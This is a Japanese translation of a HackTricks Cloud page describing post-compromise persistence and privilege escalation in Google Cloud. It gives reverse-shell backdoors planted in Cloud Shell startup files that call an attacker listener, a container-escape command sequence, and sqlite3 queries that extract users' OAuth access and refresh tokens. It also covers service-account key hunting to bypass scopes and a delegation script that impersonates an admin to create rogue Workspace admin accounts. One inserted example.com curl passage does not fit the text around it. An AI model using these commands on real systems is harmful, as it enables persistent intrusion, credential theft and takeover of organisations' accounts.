# GCP - 非サービス永続性

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社の広告を見たい**場合や、**PEASSの最新バージョンをダウンロードしたり、HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**をフォローする**。
* **ハッキングのトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

これらのテクニックは、何らかの方法でGCPの資格情報またはGCP環境で実行されているマシンを侵害した場合に便利です。

## GoogleのCloud Shell <a href="#e5eb" id="e5eb"></a>

### 永続的なバックドア

[**Google Cloud Shell**](https://cloud.google.com/shell/)は、ブラウザから直接クラウドリソースに対するコマンドラインアクセスを提供します。関連するコストは一切かかりません。

GoogleのCloud Shellには、**Webコンソール**からアクセスするか、**`gcloud cloud-shell ssh`**を実行してアクセスできます。

このコンソールには、攻撃者にとって興味深い機能がいくつかあります：

1. **Google Cloudへのアクセス権を持つ任意のGoogleユーザー**は、完全に認証されたCloud Shellインスタンスにアクセスできます。
2. そのインスタンスは、**活動がない場合でも少なくとも120日間はホームディレクトリを維持**します。
3. そのインスタンスの活動を組織が**監視する機能はありません**。

これは基本的に、攻撃者がユーザーのホームディレクトリにバックドアを配置し、ユーザーが少なくとも120日ごとにGC Shellに接続する限り、バックドアが生き残り、攻撃者は実行するたびにシェルを取得できることを意味します。
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
ホームフォルダには**`.customize_environment`**という別のファイルがあります。もし存在する場合、ユーザーが**クラウドシェル**にアクセスするたびに実行されます（前のテクニックと同様です）。前のバックドアを挿入するか、以下のようなバックドアを挿入して、ユーザーが「頻繁に」クラウドシェルを使用する限り持続性を維持します。
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
クラウドシェルで初めて認証が必要なアクションが実行されると、ユーザーのブラウザに承認ウィンドウが表示され、コマンドが実行される前に承認する必要があります。予期しないポップアップが表示される場合、対象者は疑いを持ち、永続化手法が検出される可能性があります。
{% endhint %}

### Google Cloud Shellコンテナの脱出

Google Cloud Shellはコンテナ内で実行されているため、次の操作を行うことでホストに簡単に脱出できます：
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
これはGoogleによって脆弱性とは見なされていませんが、その環境で何が起こっているかをより広い視野で把握することができます。

さらに、ホストからはサービスアカウントトークンを見つけることができます。
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
以下のスコープを使用して:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
## トークンハイジャック

### 認証済みユーザー

GCPの**認証済みユーザー**のホームフォルダにアクセスできれば、**デフォルトで**、そのユーザーのトークンを認証せずに取得することができます。また、使用するマシンやユーザーがMFAを設定していても、トークンを使用することができます。

これは、デフォルトでは**リフレッシュトークンを使用して新しいトークンを生成することができるため**です。

ユーザーの現在のトークンを取得するには、次のコマンドを実行します：
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
新しいアクセストークンを生成するための詳細情報を取得するには、次のコマンドを実行します：
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
新しいリフレッシュトークンを取得するには、リフレッシュトークン、クライアントID、およびクライアントシークレットを使用して次のコマンドを実行します：
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
### サービスアカウント

認証されたユーザーと同様に、サービスアカウントの**秘密鍵ファイルを侵害**すると、通常は**アクセスを継続できます**。\
ただし、サービスアカウントの**OAuthトークン**を盗む場合はさらに興味深いです。なぜなら、デフォルトではこれらのトークンは通常1時間だけ有効ですが、**被害者がプライベートAPIキーを削除しても、OAuthトークンは有効なままである**可能性があるからです。

### メタデータ

明らかに、GCP環境で実行されているマシン内にいる限り、メタデータエンドポイントに連絡することで、そのマシンに関連付けられたサービスアカウントに**アクセスできます**（このエンドポイントでアクセスできるOAuthトークンは通常スコープによって制限されます）。

### 対策

これらの技術のいくつかの対策については、[https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)で説明されています。

## アクセススコープのバイパス <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a>

[アクセススコープ](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam)が使用されている場合、計算インスタンス（VM）に生成されるOAuthトークンには**スコープ制限が含まれます**。ただし、この制限を**バイパス**して、侵害されたアカウントの権限を悪用することができるかもしれません。

この制限を**バイパスする最良の方法**は、侵害されたホストで**新しい資格情報を見つける**か、**制限のないOUATHトークンを生成するためのサービスキーを見つける**か、**制限の少ない別のVMに移動する**ことです。

**別のボックスに移動する**

環境には、アクセススコープが制限されていない別のボックスが存在する可能性があります。`gcloud compute instances list --quiet --format=json`の出力を表示できる場合は、特定のスコープまたは**`auth/cloud-platform`**の包括的なスコープを持つインスタンスを探してください。

また、デフォルトのサービスアカウントが割り当てられているインスタンスにも注意してください（`PROJECT_NUMBER-compute@developer.gserviceaccount.com`）。

**サービスアカウントキーを見つける**

Googleは明確に述べています[**「アクセススコープはセキュリティメカニズムではありません... OAuthを介して認証されていないリクエストでは効果がありません」**](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam)。

したがって、インスタンスに保存されている[**サービスアカウントキー**](https://cloud.google.com/iam/docs/creating-managing-service-account-keys)を見つけると、制限をバイパスできます。これらはGoogle Cloud APIに認証するために使用される**RSA秘密鍵**であり、スコープ制限のない新しいOAuthトークンを要求するために使用できます。

次のコマンドを使用して、サービスアカウントがキーをエクスポートしたことがあるかどうかを確認してください：
```bash
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
echo Looking for keys for $i:
gcloud iam service-accounts keys list --iam-account $i
done
```
これらのファイルはデフォルトでは**Compute Instanceに保存されていません**ので、それらに遭遇するには運が必要です。ファイルのデフォルト名は`[project-id]-[portion-of-key-id].json`です。したがって、プロジェクト名が`test-project`である場合、このキーファイルを探すために**`test-project*.json`という名前のファイルをファイルシステムで検索**することができます。

ファイルの内容は次のようになります：
```json
{
"type": "service_account",
"project_id": "[PROJECT-ID]",
"private_key_id": "[KEY-ID]",
"private_key": "-----BEGIN PRIVATE KEY-----\n[PRIVATE-KEY]\n-----END PRIVATE KEY-----\n",
"client_email": "[SERVICE-ACCOUNT-EMAIL]",
"client_id": "[CLIENT-ID]",
"auth_uri": "https://accounts.google.com/o/oauth2/auth",
"token_uri": "https://accounts.google.com/o/oauth2/token",
"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/[SERVICE-ACCOUNT-EMAIL]"
}
```
または、**CLIから生成された場合**、次のようになります：
```json
{
"name": "projects/[PROJECT-ID]/serviceAccounts/[SERVICE-ACCOUNT-EMAIL]/keys/[KEY-ID]",
"privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
"privateKeyData": "[PRIVATE-KEY]",
"validAfterTime": "[DATE]",
"validBeforeTime": "[DATE]",
"keyAlgorithm": "KEY_ALG_RSA_2048"
}
```
もしもこれらのファイルの1つを見つけた場合、**`gcloud`コマンドにこのサービスアカウントで再認証するよう指示**することができます。これはインスタンス上で行うことも、ツールがインストールされている任意のマシン上で行うこともできます。
```bash
gcloud auth activate-service-account --key-file [FILE]
```
以下のように、新しいOAuthトークンをテストすることができます:

```bash
curl -H "Authorization: Bearer <YOUR_OAUTH_TOKEN>" https://example.com/api/endpoint
```

このコマンドを実行すると、`<YOUR_OAUTH_TOKEN>`の部分を実際のOAuthトークンに置き換えて、`https://example.com/api/endpoint`にリクエストを送信します。
```bash
TOKEN=`gcloud auth print-access-token`
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN
```
`https://www.googleapis.com/auth/cloud-platform`がスコープにリストされているはずです。これは、**インスタンスレベルのアクセススコープに制限がない**ことを意味します。これにより、割り当てられたすべてのIAM権限を使用することができます。

## ドメイン全体の権限委任を介したWorkspaceへの拡散 <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com)は、Gmail、Googleカレンダー、Googleドライブ、Googleドキュメントなどから構成されるGoogleの**コラボレーションと生産性プラットフォーム**です。

GCPの**サービスアカウント**は、正規のユーザーをなりすましてWorkspaceのユーザーデータにプログラム的にアクセスする権限を付与することができます。これは[ドメイン全体の委任](https://developers.google.com/admin-sdk/reports/v1/guides/delegation)として知られています。これには、GMailでの**メールの読み取り**、Googleドキュメントへのアクセス、さらにはG Suite組織での新しいユーザーアカウントの作成などのアクションが含まれます。

Workspaceには、GCPとは完全に独立した[独自のAPI](https://developers.google.com/gsuite/aspects/apis)があります。権限はWorkspaceに付与され、GCPとWorkspaceの間には**デフォルトの関係はありません**。

ただし、Workspaceユーザーに対してサービスアカウントに**権限を付与する**ことが可能です。この時点でWeb UIにアクセスできる場合、**IAM -> サービスアカウント**に移動し、アカウントの中に**"ドメイン全体の委任"の列に"有効"がリストされているかどうか**を確認できます。アカウントが有効でない場合、列自体が表示されない場合があります（詳細は各サービスアカウントの詳細を読んで確認できます）。この執筆時点では、これをプログラム的に行う方法はありませんが、Googleのバグトラッカーには[この機能のリクエスト](https://issuetracker.google.com/issues/116182848)があります。

この関係を作成するには、GCPとWorkforceの両方で**有効にする必要があります**。

#### Workspaceへのアクセスのテスト

このアクセスをテストするには、**JSON形式でエクスポートされたサービスアカウントの資格情報**が必要です。これらを以前のステップで取得したか、ドメイン全体の委任が有効になっているサービスアカウントのキーを作成するために必要なアクセスを持っているかもしれません。

このトピックは少しトリッキーです... サービスアカウントには「client\_email」というものがあります。これは、エクスポートしたJSON資格情報ファイルで確認できます。おそらく、`account-name@project-name.iam.gserviceaccount.com`のようなものです。このメールアドレスで直接Workforce API呼び出しにアクセスしようとしても、委任が有効になっていても失敗します。これは、WorkforceディレクトリにはGCPサービスアカウントのメールアドレスが含まれていないためです。代わりに、Workforceとのやり取りには、実際に有効なWorkforceユーザーをなりすます必要があります。

本当にやりたいことは、**管理アクセス権限を持つユーザーをなりすまし**、そのアクセス権限を使用して**パスワードをリセットしたり、多要素認証を無効にしたり、新しい管理者アカウントを作成したりする**ことです。

Gitlabは[このPythonスクリプト](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py)を作成しました。このスクリプトは2つのことができます - ユーザーディレクトリのリストを作成し、新しい管理者アカウントを作成します。以下は、その使用方法です：
```bash
# Validate access only
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--account pwned
```
以下のスクリプトをさまざまなメールアドレスに対して試すことで、**さまざまなユーザー**をなりすますことができます。標準出力には、サービスアカウントがWorkforceにアクセスできるかどうかが表示され、新しい管理者アカウントが作成された場合は**ランダムなパスワード**も含まれます。

新しい管理者アカウントの作成に成功した場合、[Google管理コンソール](https://admin.google.com)にログインして、G Suiteのすべてのユーザーのメール、ドキュメント、カレンダーなどを完全に制御することができます。自由に操作してください。

## 参考文献

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* **HackTricksの広告を掲載したい**場合や、**最新版のPEASSを入手したい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご確認ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)を手に入れましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローしましょう。
* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、自分のハッキングテクニックを共有しましょう。

</details>
